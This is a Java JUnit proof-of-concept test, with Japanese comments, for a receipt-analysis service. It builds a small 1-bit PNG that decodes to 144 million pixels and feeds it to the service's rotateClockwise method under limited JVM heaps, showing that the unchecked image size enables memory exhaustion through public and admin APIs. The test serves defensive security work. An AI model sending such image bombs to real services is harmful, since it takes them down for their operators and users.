package com.example.receipt.service;

import org.junit.jupiter.api.Test;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.file.Files;
import java.util.concurrent.TimeUnit;

/**
 * 画像ボム（小さなPNGが巨大な画素数に展開される）が GeminiReceiptAnalyzer.rotateClockwise に届くとどうなるか。
 * 公開API(image-card)・管理API(analyze)は、Geminiが textRotation=90/180/270 を返すと rotateClockwise を呼ぶ。
 * 画像の寸法は一切検証していない。Render無料枠(512MB)のJVM既定ヒープは約128MB。
 */
class ImageBombPocTest {

    @Test
    void bombPngIsSmallButDecodesHuge() throws Exception {
        int side = 12_000;                         // 144M画素。1bitなので素のPNGは数十KB
        BufferedImage img = new BufferedImage(side, side, BufferedImage.TYPE_BYTE_BINARY);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ImageIO.write(img, "png", out);
        File f = File.createTempFile("bomb", ".png");
        f.deleteOnExit();
        Files.write(f.toPath(), out.toByteArray());
        System.out.println("POC|SEC-IMGBOMB|pngBytes=" + out.size() + " pixels=" + (long) side * side + " (upload limit 5MiB)");

        for (String xmx : new String[]{"-Xmx128m", "-Xmx256m"}) {
            ProcessBuilder pb = new ProcessBuilder(
                    System.getProperty("java.home") + "/bin/java", xmx,
                    "-cp", System.getProperty("java.class.path"),
                    "com.example.receipt.service.ImageBombPocTest$Child", f.getAbsolutePath(), "90");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            String text = new String(p.getInputStream().readAllBytes());
            p.waitFor(120, TimeUnit.SECONDS);
            System.out.println("POC|SEC-IMGBOMB|" + xmx + " exit=" + p.exitValue() + " output=" + text.trim().replace('\n', ' '));
        }
    }

    public static class Child {
        public static void main(String[] args) throws Exception {
            byte[] bytes = Files.readAllBytes(new File(args[0]).toPath());
            try {
                byte[] r = GeminiReceiptAnalyzer.rotateClockwise(bytes, "image/png", Integer.parseInt(args[1]));
                System.out.println("rotate returned " + (r == null ? "null" : r.length + " bytes"));
            } catch (Throwable t) {
                System.out.println("THROWN " + t.getClass().getName());
            }
        }
    }
}
